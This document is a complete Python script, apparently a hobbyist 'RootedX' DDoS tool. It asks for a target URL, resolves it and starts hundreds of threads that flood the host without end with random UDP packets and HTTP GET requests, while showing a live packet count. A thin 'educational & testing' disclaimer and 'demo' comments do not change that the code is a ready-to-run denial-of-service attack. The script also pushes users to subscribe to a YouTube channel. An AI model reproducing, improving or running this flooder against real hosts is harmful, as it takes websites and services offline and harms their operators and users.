#!/usr/bin/env python3

import os, socket, threading, time, random, sys, webbrowser
from urllib.parse import urlparse
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.align import Align
import pyfiglet

console = Console()
packets = 0
lock = threading.Lock()

# Clear screen
def clear():
    os.system("clear" if os.name == "posix" else "cls")

# Banner display
def show_banner(text, style):
    banner = pyfiglet.figlet_format(text)
    console.print(Align.center(f"[{style}]{banner}[/{style}]"))

# Intro
def dht_intro():
    clear()
    show_banner("RootedX-HACKERs", "bold red")
    console.print(Panel.fit(
        "[green]This tool is for [bold]educational & testing[/bold] use only.[/green]",
        title="[bold magenta]Rocky Hackers Official Tool[/bold magenta]",
        border_style="bright_magenta",
        padding=(1, 2)
    ))
    time.sleep(2)
    if os.name == "posix":
        os.system("termux-open-url https://youtube.com/@rooted-x-1")
    Prompt.ask("[yellow]Press Enter after subscribing to continue...[/yellow]")
    clear()

# Get target info
def get_target():
    show_banner("RootedArbab-DDOS", "bold green")
    console.print(Align.center(
        Panel.fit(
            "[cyan]Rooted DDOS[/cyan]\nMade by [bold green]Rootedx[/bold green]",
            title="[bold green]WELCOME[/bold green]", border_style="cyan"
        )
    ))
    link = Prompt.ask("[cyan]Enter target link (http/https)[/cyan]").strip()
    if not link.startswith("http"):
        console.print("[red]❌ Link must start with http:// or https://[/red]")
        sys.exit()
    parsed = urlparse(link)
    domain = parsed.netloc
    path = parsed.path if parsed.path else "/"
    try:
        ip = socket.gethostbyname(domain)
    except:
        console.print("[red]❌ Could not resolve domain[/red]")
        sys.exit()
    port = 443 if link.startswith("https") else 80
    return domain, ip, port, path

# UDP flood (demo)
def udp_flood(ip):
    global packets
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    while True:
        try:
            sock.sendto(data, (ip, random.randint(1, 65535)))
            with lock:
                packets += 1
        except:
            pass

# HTTP flood (demo)
def http_flood(ip, port, host, path):
    global packets
    ua_list = [
        "Mozilla/5.0", "Chrome/113.0", "Safari/537.36",
        "Edge/91.0", "Linux Android", "iPhone13,3"
    ]
    while True:
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((ip, port))
            ua = random.choice(ua_list)
            req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n\r\n"
            s.send(req.encode())
            s.close()
            with lock:
                packets += 1
        except:
            pass

def main():
    dht_intro()
    domain, ip, port, path = get_target()
    threads = int(Prompt.ask("[cyan]Enter number of threads (e.g. 200, 500, 1000)[/cyan]"))

    console.print(Panel.fit(
        f"[yellow]Target:[/yellow] {domain} ({ip})\n"
        f"[yellow]Port:[/yellow] {port}\n"
        f"[yellow]Threads:[/yellow] {threads}\n"
        f"[yellow]Path:[/yellow] {path}",
        title="[bold green]Target Locked[/bold green]",
        border_style="bright_green"
    ))

    console.print("\n[bold red]⚔️ Attacking... Press Ctrl+C to stop.[/bold red]\n")

    # Start threads
    for _ in range(threads):
        threading.Thread(target=udp_flood, args=(ip,), daemon=True).start()
        threading.Thread(target=http_flood, args=(ip, port, domain, path), daemon=True).start()

    # Live packet count
    try:
        while True:
            time.sleep(1)
            console.print(f"[📦] Packets Sent: [bold yellow]{packets}[/bold yellow]", end="\r")
    except KeyboardInterrupt:
        console.print(f"\n\n[bold red]✋ Attack stopped by user[/bold red]")
        console.print(f"[bold green]✅ Total packets sent: {packets}[/bold green]")
        try:
            webbrowser.open("https://youtube.com/@rooted-x-1?si=xkGR7U96TEtWYopa", new=2)
        except:
            console.print("🔗 Visit: https://youtube.com/@rooted-x-1?si=xkGR7U96TEtWYopa")
        sys.exit()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]⛔ Interrupted[/red]")
        sys.exit()
